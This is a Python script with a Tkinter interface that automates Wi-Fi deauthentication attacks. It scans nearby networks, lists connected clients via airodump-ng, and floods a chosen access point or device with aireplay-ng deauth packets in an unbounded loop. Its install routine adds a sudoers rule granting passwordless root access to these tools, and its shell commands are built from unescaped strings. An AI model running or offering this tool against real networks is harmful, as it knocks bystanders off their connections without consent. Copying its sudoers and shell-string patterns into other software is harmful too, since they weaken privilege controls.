#!/usr/bin/env python3
__author__ = 'Jon Stratton'
import subprocess, re, os, sys, pexpect, threading, time, tempfile, uuid
from functools import partial
from netaddr import *

try: # Optional if running install();
    import tkinter as tk
except ImportError:
    tk = None

try: # Nice to have, but not needed
    import mac_vendor_lookup as mvl
except ImportError:
    mvl = None

stop_threads = False
thisScript = sys.argv[0]
bg="#26242f"
fg="white"
client_scan=10

def install():
    # Build Desktop File
    mkdesktop = """sudo sh -c '( echo "[Desktop Entry]
Type=Application
Encoding=UTF-8
Name=Deauth
Comment=Deauth(GUI)
Exec=/usr/local/bin/deauth.py
Terminal=false
Categories=Tags;Describing;Application" > /usr/share/applications/deauth.desktop )'"""
    subprocess.call( mkdesktop, shell=True, stdout=None, stderr=None )

    # Build Sudo File
    mksudo = """sudo sh -c '( echo "Cmnd_Alias WIFIDEAUTH = /usr/sbin/iwlist * scan, /usr/sbin/aireplay-ng, /usr/sbin/airodump-ng, /usr/sbin/airmon-ng
%wifi-deauth ALL=NOPASSWD: WIFIDEAUTH" > /etc/sudoers.d/wifi-deauth-sudoers )'"""
    subprocess.call( mksudo, shell=True, stdout=None, stderr=None )

    # Build group and add user to it.
    subprocess.call( "sudo groupadd wifi-deauth", shell=True, stdout=None, stderr=None )
    subprocess.call( "sudo usermod -a -G wifi-deauth $USER", shell=True, stdout=None, stderr=None )

    # Install the script
    subprocess.call( "sudo cp " + thisScript + " /usr/local/bin/", shell=True, stdout=None, stderr=None )

    # Install Deps
    subprocess.call( "sudo DEBIAN_FRONTEND=noninteractive apt-get install -y python3-tk", shell=True, stdout=None, stderr=None )

def uninstall():
    subprocess.call( "sudo rm /usr/local/bin/" + thisScript, shell=True, stdout=None, stderr=None )
    subprocess.call( "sudo groupdel wifi-deauth", shell=True, stdout=None, stderr=None )
    subprocess.call( "sudo rm /etc/sudoers.d/wifi-deauth-sudoers", shell=True, stdout=None, stderr=None )
    subprocess.call( "sudo rm /usr/share/applications/deauth.desktop", shell=True, stdout=None, stderr=None )

# List the connected network interfaces.
def system_interfaces(if_type = None):
    if_list = []
    for iface in os.listdir('/sys/class/net'):
        if (if_type) and (not iface.startswith(if_type)):
            continue
        if (iface == 'lo'):
            continue
        if_list.append(iface)
    return(if_list)

def start_interface(interface):
    new_device = ''
    cmd = 'sudo airmon-ng start %s' % ( interface )
    print( 'Executing: %s' % ( cmd ) )
    p = pexpect.spawn( cmd, timeout=10000 )
    try:
       p.expect( 'mac80211 monitor mode vif enabled.* on \[.*\].*' )
       split_string = p.after.decode('utf-8').rstrip().split(']')
       new_device = split_string[-1].rstrip(')')
    except:
       pass
    return new_device

# Stop monitoring interface
def stop_interface(interface):
    cmd = 'sudo airmon-ng stop %s > /dev/null' % ( interface )
    print( 'Executing: %s' % ( cmd ) )
    code = subprocess.call( cmd, shell=True, stdout=None, stderr=None )
    return code

def get_clients(interface, bssid, channel):
    clients = []
    clientToInfo = {}
    file_base = '%s/airodump_%s' % ( tempfile.gettempdir(), uuid.uuid4() )
    file_pcap = '%s-01.cap' % ( file_base )
    file_csv = '%s-01.csv' % ( file_base )

    cmd = 'sudo airodump-ng %s --bssid %s --channel %s --output-format pcap --write %s -u 2 --output-format csv' % (interface, bssid, channel, file_base)
    print( 'Executing: %s' % ( cmd ) )
    p = pexpect.spawn(cmd, timeout=100000)
    time.sleep(client_scan)
    p.sendcontrol('c');

    care = 0
    f = open(file_csv,"r")
    lines = f.readlines()
    for line in lines:
        if line.startswith("Station MAC"):
            care = 1
        elif care and line.strip():
            split_line = re.split('\s*,\s*',line)
            client_mac = split_line[0]
            ap_mac = split_line[5]
            clients.append(client_mac)
            clientToInfo[client_mac] = {}
            clientToInfo[client_mac]['ap'] = ap_mac
            try:
                clientToInfo[client_mac]['Manufacturer'] = mvl.MacLookup().lookup(client_mac)
            except:
                pass

    # TODO, fig perm issue and cleanup
    #os.remove(file_pcap)
    #os.remove(file_csv)
    return clients, clientToInfo

# Scan the interface for networks.
def get_available_networks(interface):
    accesspoints = []
    APtoInfo = {}
    address = ''
    cmd = 'sudo iwlist %s scan' % ( interface )
    p = subprocess.Popen( cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT )
    for line in p.stdout.readlines():
       split_line = line.decode('utf-8').rstrip().split(':')
       key = split_line[0]
       value = re.sub(r'^"|"$', '', ':'.join( split_line[1:] ).strip())
       if not value:
          continue
       if key.endswith('Address'): # New record found
          if address:
             accesspoints.append(address)
          address = value
          APtoInfo[address] = {}
          try: 
               APtoInfo[address]['Manufacturer'] = mvl.MacLookup().lookup(value)
          except:
               pass
       elif address:
          APtoInfo[address][key.strip()] = value
    retval = p.wait
    if address:
       accesspoints.append(address)

    return accesspoints, APtoInfo

# Deauth all clients on network.
def deauth_clients(interface, ap, client):
    while True:
        global stop_threads
        if stop_threads:
            break
        cmd = 'sudo aireplay-ng -0 5 -a %s %s' % ( ap, interface )
        if client:
            cmd += ' -c %s' % client
        code = subprocess.call( cmd, shell=True, stdout=None, stderr=None )
        #time.sleep(1)
        #print( 'Executing: %s' % ( cmd ) )

# Dont create this object if we dont have tk. Could be installing
if tk is not None:
    class Application(tk.Frame):
        def __init__(self, master=None):
            super().__init__(master)
            self.interfaces = system_interfaces("wl")
            self.interface = ""
            if len(self.interfaces) > 0:
                self.interface = self.interfaces[0]
            #self.interface = 'HARDCODE'
            self.accesspoints = []
            self.clients = []
            self.APtoInfo = {}
            self.clientToInfo = {}
            self.target_address = ""
            self.running_attack_thread = ""

            self.master = master
            self.pack()
            self.main_select()

        def main_select(self):
            for widget in self.winfo_children():
                widget.destroy()
            self.master.title("Main")
            self.main = tk.Button(self, text="Scan and Select", command=self.main_select_scan, bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side="top")
            self.main = tk.Button(self, text="Attack Selected", command=self.attack_progress, bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side="top")

        def main_select_scan(self):
            self.accesspoints, self.APtoInfo = get_available_networks(self.interface)
            self.scan_and_select()

        def scan_and_select(self):
            for widget in self.winfo_children():
                widget.destroy()
            self.master.title("Scan and Select")

            self.main = tk.Button(self, text="[BACK]", command=self.main_select, bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side="top")

            for ap_mac in self.accesspoints:
                name = self.APtoInfo[ap_mac].get('ESSID', ap_mac)
                if not self.APtoInfo[ap_mac].get('ESSID', ''): # TODO, add scrollbar to deal with all the large list
                    continue

                if (len(name) > 20):
                    name = name[0:20] + '...'
                if self.APtoInfo[ap_mac].get('Manufacturer', ''):
                    name = name + ' - ' + self.APtoInfo[ap_mac].get('Manufacturer', '')

                self.main = tk.Button(self, text=name, command=partial(self.network_options, ap_mac), bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
                self.main.pack(side="bottom")

        def network_options(self, ap_mac):
            for widget in self.winfo_children():
                widget.destroy()
            self.master.title("Network Options")

            name = self.APtoInfo[ap_mac].get('ESSID', '')

            self.main = tk.Button(self, text='[BACK]', command=self.scan_and_select, bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side='top')
            self.main = tk.Button(self, text='Select ' + name, command=partial(self.network_options_select, ap_mac), bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side='top')
            self.main = tk.Button(self, text='Client List', command=partial(self.client_list_scan, ap_mac), bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side='top')

        def network_options_select(self, ap_mac):
            self.target_address = ap_mac
            self.main_select()

        def client_list_scan(self, ap_mac):
            channel = self.APtoInfo[ap_mac].get('Channel', '')
            mon_interface = start_interface(self.interface) 
            try:
               self.clients, self.clientToInfo = get_clients(mon_interface, ap_mac, channel)
            except:
               pass
            stop_interface(mon_interface)
            self.client_list(ap_mac)

        def client_list(self, ap_mac):
            for widget in self.winfo_children():
                widget.destroy()
            self.master.title("Client List")

            self.main = tk.Button(self, text="[BACK]", command=partial(self.network_options, ap_mac), bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side="top")

            for client_mac in self.clients:
                name = client_mac

                if self.clientToInfo[client_mac].get('Manufacturer', ''):
                    name = name + ' - ' + self.clientToInfo[client_mac].get('Manufacturer', '')

                self.main = tk.Button(self, text=name, command=partial(self.client_options, client_mac), bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
                self.main.pack(side="bottom")

        def client_options(self, client_mac):
            for widget in self.winfo_children():
                widget.destroy()
            self.master.title("Client Options")

            self.main = tk.Button(self, text="[BACK]", command=partial(self.client_list, client_mac), bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side="top")
            self.main = tk.Button(self, text='Select ' + client_mac, command=partial(self.client_options_select, client_mac), bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side="top")

        def client_options_select(self, client_mac):
            self.target_address = client_mac
            self.main_select()

        def attack_progress(self):
            for widget in self.winfo_children():
                widget.destroy()
            self.master.title("Attack Progress")
            self.main = tk.Button(self, text="[BACK]", command=self.main_select, bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side="top")
            self.main = tk.Button(self, text="Deauth", command=partial(self.attack_thread_start, self.interface, self.target_address), bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side="top")
            self.main = tk.Button(self, text="Stop", command=self.attack_thread_stop, bg=bg, fg=fg, activebackground=bg, activeforeground=fg)
            self.main.pack(side="top")

        def attack_thread_start(self, interface, address):
            global stop_threads
            stop_threads = False
            
            client = ''
            ap = ''
            if self.clientToInfo.get(address, ''):
                print(self.clientToInfo.get(address, ''))
                client = address
                ap = self.clientToInfo[address].get('ap', '')
            elif self.APtoInfo.get(address, ''):
                print(self.APtoInfo.get(address, ''))
                ap = address

            self.running_attack_thread = threading.Thread(target=deauth_clients, args=(interface, ap, client))
            self.running_attack_thread.start()

        def attack_thread_stop(self):
            global stop_threads
            stop_threads = True

if (__name__ == '__main__'):
   if len(sys.argv) > 1:
      arg = sys.argv[1]
      if sys.argv[1] == 'uninstall':
         uninstall()
      else:
         install()
   elif tk is None:
      print('sudo apt-get install python3-tk');
   else:
      root = tk.Tk()
      root.config(bg=bg)
      app = Application(master=root)
      app.mainloop()
